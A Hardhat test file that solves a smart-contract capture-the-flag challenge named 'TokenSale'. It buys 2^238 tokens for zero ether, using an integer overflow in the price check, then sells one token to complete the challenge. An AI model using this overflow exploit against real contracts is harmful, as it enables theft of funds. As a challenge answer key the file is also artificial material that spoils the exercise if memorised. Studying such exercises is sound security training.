import { expect } from 'chai';
import { ethers } from 'hardhat';
import { etherToWei } from '../utils';

describe('TokenSale', function () {
  it('should perform an overflow', async function () {
    const Challenge = await ethers.getContractFactory('TokenSale');
    const challenge = await Challenge.deploy({ value: etherToWei(1) });
    await challenge.deployed();

    const numTokens = ethers.BigNumber.from(2).pow(238);
    const buyTx = await challenge.buy(numTokens, { value: 0 });
    await buyTx.wait();

    const tokensToSell = 1;
    const sellTx = await challenge.sell(tokensToSell);
    await sellTx.wait();

    expect(await challenge.isComplete()).to.be.true;
  });
});
